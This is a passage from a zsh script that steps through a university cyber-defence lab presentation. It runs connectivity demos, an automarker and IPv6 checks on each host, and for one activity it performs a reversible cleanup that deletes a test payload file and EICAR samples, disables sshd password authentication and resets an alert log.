            slide "Reach across the tunnel (Part F)" "ping the server tun0 over both stacks (10.8.0.1 / df80::1) + reach the DMZ web server" text "echo '== ping IntGW tun0 (v4) =='; ping -c3 -W2 10.8.0.1 2>&1 | tail -3; echo; echo '== ping IntGW tun0 (v6) =='; ping -6 -c3 -W2 2404:9400:29c1:df80::1 2>&1 | tail -3; echo; echo '== reach the DMZ over the VPN =='; ping -c3 -W2 192.168.1.80 2>&1 | tail -3; echo; curl -sSI --max-time 5 http://192.168.1.80 2>&1 | head -3"
            ;;
        esac
        ;;
    esac
}

# =============================================================================
# Per-host walkthrough  (demos -> automarker -> IPv6 verification)
# =============================================================================
SHOW_IPV6_VERIFY=1     # set 0 to skip the IPv6 verification block

show_host() {
    local H="$1" slide title sub lexer cmd

    # --- activity-specific demos ---
    build_demos "$H"
    for slide in "${DEMO_SLIDES[@]}"; do
        title="${slide%%$'\t'*}"; slide="${slide#*$'\t'}"
        sub="${slide%%$'\t'*}";   slide="${slide#*$'\t'}"
        lexer="${slide%%$'\t'*}"; cmd="${slide#*$'\t'}"
        host_banner "$H"
        print_title "$title" "$sub"
        # Show the exact command being run (dim). print -r (not -P) so a curl
        # '%{...}' format string isn't eaten by prompt expansion.
        print -r -- $'\e[2m$ '"$cmd"$'\e[0m'
        hl "$(run "$H" "$cmd")" "$lexer"
        wait_for_enter
    done

    # --- automarker (root-owned copy of the repo script; runs against its own stack) ---
    host_banner "$H"
    print_title "Automarker" "automark_activity${ACTIVITY}_ipv6.sh (root-owned copy of the ~/3014ICT checkout)"
    # Run the automarker only where the deploy installed one for this activity.
    # A host walked purely for a demo slide (e.g. srv in Activity 4.1, for the
    # mail-delivery reaffirmation) has no automarker for it — skip gracefully with
    # sudo -n so it never falls back to an interactive password prompt.
    run "$H" "if [ -e '$(remote_automark)' ]; then sudo -n $(remote_automark); else echo '(No Activity ${ACTIVITY} automarker installed on this host — it contributes demo slides only.)'; fi"
    wait_for_enter

    # --- IPv6 verification (labels local, tests run on the remote) ---
    # Only for Activity 1 — the generic IPv6 capability demo is shown once there;
    # later activities have their own IPv6 evidence in the demos + automarker.
    if (( SHOW_IPV6_VERIFY )) && [[ "$ACTIVITY" == 1 ]]; then
        host_banner "$H"
        print_title "IPv6 verification" "Testing IPv6 capability"
        print -P "%F{202}Show IPv6 routes%f"
        hl "$(run "$H" "ip -6 route")" ip
        print -P "%F{202}\nCheck DNS resolves AAAA records%f"
        hl "$(run "$H" "nslookup google.com")" ip
        print -P "%F{202}Ping google.com via IPv6%f"
        hl "$(run "$H" "ping -6 -c1 google.com")" ip
        print -P "%F{202}\nTraceroute to google.com via IPv6%f"
        hl "$(run "$H" "traceroute -6 google.com")" ip
        wait_for_enter
    fi

    # --- Activity 5: automatic cleanup & reset (rehearsal-friendly) ---
    # Runs AFTER the automarker, so it never wipes the alerts the marker checks.
    # Removes the EICAR test file, forces sshd password auth back to off, and
    # clears the Rustinel alert log (stop / clear / start) — so each run leaves a
    # clean slate for the next, and demonstrates the "safe, controlled, reversible"
    # cleanup the brief asks for. All three actions are pinned NOPASSWD helpers.
    if [[ "$ACTIVITY" == 5 ]]; then
        host_banner "$H"
        print_title "Cleanup & reset" "remove the /tmp payload, disable sshd password auth, clear the alert log"
        hl "$(run "$H" "rm -f /tmp/.systemd-worker ~/eicar.com ~/eicar_run && echo 'removed /tmp/.systemd-worker (and any stale eicar files)'; sudo /usr/local/sbin/labview-ssh-passwordauth off; sudo /usr/local/sbin/labview-rustinel-reset")" text
        wait_for_enter
    fi
}

# =============================================================================
# Activity selection
# =============================================================================
choose_activity() {
    if [[ -n "$1" ]] && (( ${VALID_ACTS[(Ie)$1]} )); then ACTIVITY="$1"; return; fi
    print -P "%F{045}%BSelect the activity to present:%b%f"
    local a
    for a in "${VALID_ACTS[@]}"; do print -P "   %F{220}${a}%f  — ${ACT_NAME[$a]}"; done
    while true; do
        print -n "Activity number: "; read ACTIVITY
        (( ${VALID_ACTS[(Ie)$ACTIVITY]} )) && break
        print -P "%F{160}Invalid — choose one of: ${VALID_ACTS}%f"
    done
}

# =============================================================================
# Main
# =============================================================================
choose_activity "$1"

print_welcome "3014ICT - CYBER SECURITY DEFENCE AND INCIDENT RESPONSE" \
              "Activity ${ACTIVITY} — ${ACT_NAME[$ACTIVITY]}    |    Chris Grul - s5501035"
wait_for_enter

show_network_map          # per-activity colourised topology
wait_for_enter

HOSTS=( ${(s: :)ACT_HOSTS[$ACTIVITY]} )     # hosts for this activity
for H in "${HOSTS[@]}"; do
    show_host "$H"
done

print -P "%F{046}Finished Activity ${ACTIVITY} — ${ACT_NAME[$ACTIVITY]}.%f"
